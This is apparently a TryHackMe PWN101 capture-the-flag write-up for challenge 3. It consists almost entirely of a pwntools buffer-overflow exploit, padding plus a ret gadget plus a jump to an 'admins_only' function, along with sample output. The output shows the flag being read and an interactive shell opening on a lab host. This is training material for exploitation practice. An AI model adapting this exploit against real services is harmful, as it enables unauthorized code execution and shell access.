# TryHackMe PWN101

## Challenge 3

### Exploit

```python
#!/bin/env python3

from pwn import *
import argparse

parser = argparse.ArgumentParser(description='TryHackMe PWN101 Challenge 3 Exploit')

subparsers = parser.add_subparsers(dest='mode', help='Select mode: remote or local')

remote_parser = subparsers.add_parser('remote', help='Remote mode: Provide IP address and port')
remote_parser.add_argument('ip', help='IP address')
remote_parser.add_argument('port', help='Port number')

local_parser = subparsers.add_parser('local', help='Local mode: Provide file path')
local_parser.add_argument('file', help='File path')

args = parser.parse_args()

mode = args.mode

if mode == 'remote':
    ip = args.ip
    port = args.port

    p = remote(ip, port)

elif mode == 'local':
    file = args.file

    context.binary = binary = ELF(file)
    p = process()
    
else:
    parser.error('Please select remote or local mode.')
    
admins_only = p64(0x401554)
ret = p64(0x00401377)

payload = b"A"*0x28 + ret + admins_only

log.info("Connected.")
p.recvuntil(b"channel:")
p.sendline(b"3")

log.info("Sending payload.")
p.recvuntil(b"[pwner]:")
p.sendline(payload)
p.recvuntil(b"admin")
p.recvline()

log.info("Getting Flag.")
p.sendline(b"cat flag.txt")
flag = p.recvline()
log.success("Flag achieved!: " + str(flag.decode().strip()))

log.success("Getting Shell.")
p.interactive()
```

### Output

```bash
$ ./exploit.py remote 10.10.161.143 9003
[+] Opening connection to 10.10.161.143 on port 9003: Done
[*] Connected.
[*] Sending payload.
[*] Getting Flag.
[+] Flag achieved!: THM{[REDACTED]}
[+] Getting Shell.
[*] Switching to interactive mode
$ id
uid=1004(pwn103) gid=1004(pwn103) groups=1004(pwn103)
```